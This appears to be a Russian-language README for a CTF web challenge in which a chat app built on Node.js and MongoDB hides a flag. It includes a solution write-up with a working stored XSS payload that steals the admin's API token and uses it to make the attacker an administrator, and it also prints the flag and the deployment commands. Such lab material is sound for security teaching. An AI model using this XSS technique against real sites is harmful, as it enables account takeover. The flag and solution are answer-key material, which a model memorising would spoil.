# WEB 300 - Neurobot

## Задача
Получить доступ к функциям администратора и получить флаг из базы данных. Даны исходные коды.

## Легенда
Эрудиты с планеты Архимеда рассылают по галактике информацию о том, что им удалось создать сверхразум способный решать любые задачи. Они хотят продать его и для подтверждения своего достижения открыли канал связи с ним. Возможно пообщавшись с ним, вы скажете, стоящая ли это покупка

## Условия на сервере
- Сервисы: NODEJS, MONGODB
- Порты: 3000, 3001

### Флаг: #x55-4r3-r341-BAD

## Решение:
Из исходных кодов можно заметить, что запускается на прослушивание 2 порта - 3000-ый и 3001-ый.
- По 3000-ому доступен веб-интерфейс:
  - отправка сообщений с фильтрацией, 
  - регистрация и логин
- По 3001-ому (API) присутствует:
  - отправка фидбека
  - просмотр всех фидбеков(доступно только администратору)
  - установка пользователей в администраторы(доступно только администратору)
  - отправка сообщений, которое не делает фильтрации от "script". 

Так же отправка сообщений с апи позволяет отослать сообщение отдельному пользователю. Для доступа к апи необходимо отправить секретный токен(который можно увидеть в веб интерфейсе). В итоге отсылаем администратору xss с апи - повышаем свои привелегии. После чего получаем доступ к апи от админа и находим флаг в фидбеке.

### Код xss для отправки через апи:
```
<script>var a = {\"api_token\":$(\"b\").html(), \"user_to\":\"USERNAME\"};$.ajax({method: \"POST\",url: \"http://127.0.0.1:3001/admin\",data: JSON.stringify(a)});</script>
```

## Развертывание

- Развернуть Express и зависимости ``` npm i ```
- Создать базу данных **chat**
- Сделать админа, после регистрации пользователя "admin": ``` db.users.update({"login":"admin"},{$set: {"is_admin":true}}) ```
- Положить флаг : ``` db.support.insert({"user_from":"admin", "message":"Flag is: #x55-4r3-r341-BAD"}) ```
- Запуск : ``` ./bin/www ``` или ``` nodejs ./bin/www ```
